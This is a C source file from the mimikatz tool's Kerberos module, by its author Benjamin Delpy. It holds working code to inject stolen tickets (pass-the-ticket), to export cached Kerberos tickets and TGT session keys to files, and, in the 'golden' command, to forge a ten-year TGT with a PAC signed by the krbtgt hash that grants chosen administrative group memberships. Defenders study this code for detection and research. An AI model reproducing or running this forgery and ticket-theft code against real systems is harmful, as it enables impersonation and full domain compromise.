/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_kerberos.h"

STRING	kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
DWORD	g_AuthenticationPackageId_Kerberos = 0;
BOOL	g_isAuthPackageKerberos = FALSE;
HANDLE	g_hLSA = NULL;

const KUHL_M_C kuhl_m_c_kerberos[] = {
	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
	{kuhl_m_kerberos_list,		L"list",		L"List ticket(s)"},
	{kuhl_m_kerberos_tgt,		L"tgt",			L"Retrieve current TGT"},
	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
	{kuhl_m_kerberos_golden,	L"golden",		L"Willy Wonka factory"},
#ifdef KERBEROS_TOOLS
	{kuhl_m_kerberos_decode,	L"decrypt",		L"Decrypt encoded ticket"},
	{kuhl_m_kerberos_pac_info,	L"pacinfo",		L"Some infos on PAC file"},
#endif
};

const KUHL_M kuhl_m_kerberos = {
	L"kerberos",	L"Kerberos package module",	L"",
	sizeof(kuhl_m_c_kerberos) / sizeof(KUHL_M_C), kuhl_m_c_kerberos, kuhl_m_kerberos_init, kuhl_m_kerberos_clean
};

NTSTATUS kuhl_m_kerberos_init()
{
	NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
	if(NT_SUCCESS(status))
	{
		status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
		g_isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}

NTSTATUS kuhl_m_kerberos_clean()
{
	return LsaDeregisterLogonProcess(g_hLSA);
}

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if(g_hLSA && g_isAuthPackageKerberos)
		status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	PBYTE fileData;
	DWORD fileSize, submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;

	if(argc)
	{
		if(kull_m_file_readData(argv[argc - 1], &fileData, &fileSize))
		{
			submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
			if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
			{
				pKerbSubmit->MessageType = KerbSubmitTicketMessage;
				pKerbSubmit->KerbCredSize = fileSize;
				pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
				RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);

				status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
				if(NT_SUCCESS(status))
				{
					if(NT_SUCCESS(packageStatus))
						kprintf(L"Ticket \'%s\' successfully submitted for current session\n", argv[0]);
					else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", packageStatus);
				}
				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

				LocalFree(pKerbSubmit);
			}
			LocalFree(fileData);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	} else PRINT_ERROR(L"Missing argument : ticket filename\n");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_PURGE_TKT_CACHE_REQUEST kerbPurgeRequest = {KerbPurgeTicketCacheMessage, {0, 0}, {0, 0, NULL}, {0, 0, NULL}};
	PVOID dumPtr;
	DWORD responseSize;

	status = LsaCallKerberosPackage(&kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &dumPtr, &responseSize, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
			kprintf(L"Ticket(s) purge for current session is OK\n", argv[0]);
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_RETRIEVE_TKT_REQUEST kerbRetrieveRequest = {KerbRetrieveTicketMessage, {0, 0}, {0, 0, NULL}, 0, 0, KERB_ETYPE_NULL, {0, 0}};
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData;
	KIWI_KERBEROS_TICKET kiwiTicket = {0};
	
	status = LsaCallKerberosPackage(&kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
	kprintf(L"Keberos TGT of current session : ");
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			kiwiTicket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
			kiwiTicket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
			kiwiTicket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
			kiwiTicket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
			kiwiTicket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
			kiwiTicket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
			kiwiTicket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
			kiwiTicket.KeyType = kiwiTicket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType; // TicketEncType not in response
			kiwiTicket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
			kiwiTicket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
			kiwiTicket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
			kiwiTicket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
			kiwiTicket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;
			kiwiTicket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
			kiwiTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
			kuhl_m_kerberos_ticket_display(&kiwiTicket, FALSE);
			kprintf(L"\n(NULL session key means allowtgtsessionkey is not set to 1)\n");
			LsaFreeReturnBuffer(pKerbRetrieveResponse);
		}
		else if(packageStatus == SEC_E_NO_CREDENTIALS)
			kprintf(L"no ticket !\n");
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage : %08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
{
	NTSTATUS status, packageStatus;
	KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = {KerbQueryTicketCacheExMessage, {0, 0}};
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE pKerbCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData, i;
	wchar_t * filename;
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);

	status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			for(i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
			{
				kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype(pKerbCacheResponse->Tickets[i].EncryptionType));
				kprintf(L"\n   Start/End/MaxRenew: ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
				kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].RenewTime);
				kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i].ServerRealm);
				kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i].ClientRealm);
				kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
				kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse->Tickets[i].TicketFlags);
			
				if(export)
				{
					szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
					if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
					{
						pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
						pKerbRetrieveRequest->CacheOptions = /*KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | */KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
						pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
						pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
						RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);

						status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
						if(NT_SUCCESS(status))
						{
							if(NT_SUCCESS(packageStatus))
							{
								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))
								{
									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
										kprintf(L"\n   * Saved to file     : %s", filename);
									LocalFree(filename);
								}
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							}
							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
						}
						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);

						LocalFree(pKerbRetrieveRequest);
					}
				}
				kprintf(L"\n");
			}
			LsaFreeReturnBuffer(pKerbCacheResponse);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : %08x\n", packageStatus);
	}
	else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : %08x\n", status);

	return STATUS_SUCCESS;
}

wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
	
	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
			kull_m_file_cleanFilename(buffer);
		else
			buffer = (wchar_t *) LocalFree(buffer);
	}
	return buffer;
}

GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
	DWORD i, j, nbGroups, id = 500;
	PCWCHAR szUser, szDomain, szSid, szNTLM, szId, szGroups, base, filename;
	PISID pSid;
	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;

	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");

	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
			{
				if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
				{
					if(kull_m_string_args_byName(argc, argv, L"krbtgt", &szNTLM, NULL))
					{
						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
							id = wcstoul(szId, NULL, 0);

						if(kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL))
						{
							for(nbGroups = 0, base = szGroups; base && *base; )
							{
								if(wcstoul(base, NULL, 0))
									nbGroups++;
								if(base = wcschr(base, L','))
									base++;
							}
							if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
							{
								for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
								{
									if(j = wcstoul(base, NULL, 0))
									{
										dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
										dynGroups[i].RelativeId = j;
										i++;
									}
									if(base = wcschr(base, L','))
										base++;
								}
							}
						}
						if(nbGroups && dynGroups)
							groups = dynGroups;
						else
						{
							groups = defaultGroups;
							nbGroups = sizeof(defaultGroups) / sizeof(GROUP_MEMBERSHIP);
						}
						if(kull_m_string_stringToHex(szNTLM, ntlm, sizeof(ntlm)))												
						{
							kprintf(
								L"User      : %s\n"
								L"Domain    : %s\n"
								L"SID       : %s\n"
								L"User Id   : %u\n", szUser, szDomain, szSid, id);
							kprintf(L"Groups Id : *");
							for(i = 0; i < nbGroups; i++)
								kprintf(L"%u ", groups[i]);
							kprintf(L"\nkrbtgt    : ");
								
							kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
							kprintf(L"-> Ticket : %s\n\n", filename);

							if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, pSid, ntlm, id, groups, nbGroups))
							{
								if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
									kprintf(L"\nFinal Ticket Saved to file !\n");
								else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
							}
							else PRINT_ERROR(L"KrbCred error\n");
						}
						else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
					}
					else PRINT_ERROR(L"Missing krbtgt argument\n");

					LocalFree(pSid);
				}
				else PRINT_ERROR_AUTO(L"SID seems invalid - ConvertStringSidToSid");
			}
			else PRINT_ERROR(L"Missing SID argument\n");
		}
		else PRINT_ERROR(L"Missing domain argument\n");
	}
	else PRINT_ERROR(L"Missing user argument\n");

	if(dynGroups)
		LocalFree(groups);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD keySize, LPCVOID data, DWORD dataSize, LPVOID * output, DWORD * outputSize, BOOL encrypt)
{
	NTSTATUS status;
	PKERB_ECRYPT pCSystem;
	PVOID pContext;
	DWORD bufferSize;

	status = CDLocateCSystem(eType, &pCSystem);
	if(NT_SUCCESS(status))
	{
		status = pCSystem->Initialize(key, keySize, keyUsage, &pContext);
		if(NT_SUCCESS(status))
		{
			bufferSize = encrypt ? (dataSize + pCSystem->Size) : (dataSize /*- pCSystem->Size*/);
			if(*output = LocalAlloc(LPTR, bufferSize))
			{
				status = encrypt ? pCSystem->Encrypt(pContext, data, dataSize, *output, outputSize) : pCSystem->Decrypt(pContext, data, dataSize, *output, outputSize);
				if(!NT_SUCCESS(status))
					LocalFree(*output);
			}
			pCSystem->Finish(&pContext);
		}
	}
	return status;
}
#ifndef NTSECAPI_HEADER_FIXED
const BYTE KerbFixedKey[16] = {0xde, 0xad, 0xc0, 0xde, 0x0e, 0xe0, 0xb0, 0x0b, 0xc0, 0xff, 0xee, 0x50, 0xba, 0xad, 0xf0, 0x0d}; // to be used when ntsecapi.h not fixed ! - http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader
#endif
PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, PISID sid, LPCBYTE krbtgt, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
{
	NTSTATUS status;
	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
	KIWI_KERBEROS_TICKET ticket = {0};
	KERB_VALIDATION_INFO validationInfo = {0};
	SYSTEMTIME st;
	PPACTYPE pacType; DWORD pacTypeSize;

	GetSystemTime(&st); st.wMilliseconds = 0;

	if(ticket.ClientName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */))
	{
		ticket.ClientName->NameCount = 1;
		ticket.ClientName->NameType = KRB_NT_PRINCIPAL;
		RtlInitUnicodeString(&ticket.ClientName->Names[0], username);
	}
	if(ticket.ServiceName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */+ sizeof(UNICODE_STRING)))
	{
		ticket.ServiceName->NameCount = 2;
		ticket.ServiceName->NameType = KRB_NT_SRV_INST;
		RtlInitUnicodeString(&ticket.ServiceName->Names[0],	L"krbtgt");
		RtlInitUnicodeString(&ticket.ServiceName->Names[1], domainname);
	}
	ticket.DomainName = ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.ServiceName->Names[1];

	ticket.TicketFlags = KERB_TICKET_FLAGS_initial | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
	ticket.TicketKvno = 2; // windows does not care about it...
	ticket.TicketEncType = ticket.KeyType = KERB_ETYPE_RC4_HMAC_NT;
	ticket.Key.Length = 16;
	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
	#ifdef NTSECAPI_HEADER_FIXED // when ntsecapi.h fixed ! - http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader
		RtlGenRandom(ticket.Key.Value, ticket.Key.Length);
	#else
		RtlCopyMemory(ticket.Key.Value, KerbFixedKey, ticket.Key.Length);
	#endif
	SystemTimeToFileTime(&st, &ticket.StartTime);
	st.wYear += 10;
	SystemTimeToFileTime(&st, &ticket.EndTime);
	st.wYear += 10; // just for lulz
	SystemTimeToFileTime(&st, &ticket.RenewUntil);
		
	validationInfo.LogonTime = ticket.StartTime;
	KIWI_NEVERTIME(&validationInfo.LogoffTime);
	KIWI_NEVERTIME(&validationInfo.KickOffTime);
	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);

	validationInfo.EffectiveName		= ticket.ClientName->Names[0];
	validationInfo.LogonDomainId		= sid;
	validationInfo.UserId				= userid;
	validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
	validationInfo.PrimaryGroupId		= groups[0].RelativeId;

	validationInfo.GroupCount = cbGroups;//sizeof(groups) / sizeof(GROUP_MEMBERSHIP);
	validationInfo.GroupIds = groups;
	
	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, &pacType, &pacTypeSize))
	{
		kprintf(L" * PAC generated\n");
		status = kuhl_m_pac_signature(pacType, pacTypeSize, krbtgt, LM_NTLM_HASH_LENGTH);
		if(NT_SUCCESS(status))
		{
			kprintf(L" * PAC signed\n");
			if(App_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
			{
				kprintf(L" * EncTicketPart generated\n");
				status = kuhl_m_kerberos_encrypt(ticket.TicketEncType, KRB_KEY_USAGE_AS_REP_TGS_REP, krbtgt, LM_NTLM_HASH_LENGTH, App_EncTicketPart, kull_m_asn1_getSize(App_EncTicketPart), (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
				if(NT_SUCCESS(status))
				{
					kprintf(L" * EncTicketPart encrypted\n");
					if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket))
						kprintf(L" * KrbCred generated\n");
				}
				else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
				LocalFree(App_EncTicketPart);
			}
		}
		LocalFree(pacType);
	}
	
	if(ticket.Ticket.Value)
		LocalFree(ticket.Ticket.Value);
	if(ticket.Key.Value)
		LocalFree(ticket.Key.Value);
	if(ticket.ClientName)
		LocalFree(ticket.ClientName);
	if(ticket.ServiceName)
		LocalFree(ticket.ServiceName);

	return App_KrbCred;
}

#ifdef KERBEROS_TOOLS
NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	BYTE ntlm[LM_NTLM_HASH_LENGTH];
	PCWCHAR szNtlm, szIn, szOut, szOffset, szSize;
	PBYTE encData, decData;
	DWORD encSize, decSize, offset = 0, size = 0;

	if(kull_m_string_args_byName(argc, argv, L"key", &szNtlm, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
		{
			kull_m_string_args_byName(argc, argv, L"out", &szOut, L"out.kirbi");
			kull_m_string_args_byName(argc, argv, L"offset", &szOffset, NULL);
			kull_m_string_args_byName(argc, argv, L"size", &szSize, NULL);

			if(kull_m_file_readData(szIn, &encData, &encSize))
			{
				if(szOffset && szSize)
				{
					offset = wcstoul(szOffset, NULL, 0);
					size = wcstoul(szSize, NULL, 0);
				}
				
				if(kull_m_string_stringToHex(szNtlm, ntlm, sizeof(ntlm)))												
				{
					status = kuhl_m_kerberos_encrypt(KERB_ETYPE_RC4_HMAC_NT, KRB_KEY_USAGE_AS_REP_TGS_REP, ntlm, LM_NTLM_HASH_LENGTH, encData + offset, offset ? size : encSize, (LPVOID *) &decData, &decSize, FALSE);
					if(NT_SUCCESS(status))
					{
						if(kull_m_file_writeData(szOut, (PBYTE) decData, decSize))
							kprintf(L"DEC data saved to file! (%s)\n", szOut);
						else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
						LocalFree(decData);
					}
					else PRINT_ERROR(L"kuhl_m_kerberos_encrypt - DEC (0x%08x)\n", status);
				}
				else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
				LocalFree(encData);
			}
			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
		}
		else PRINT_ERROR(L"arg \'in\' missing\n");
	}
	else PRINT_ERROR(L"arg \'key\' missing\n");
	return STATUS_SUCCESS;
}
#endif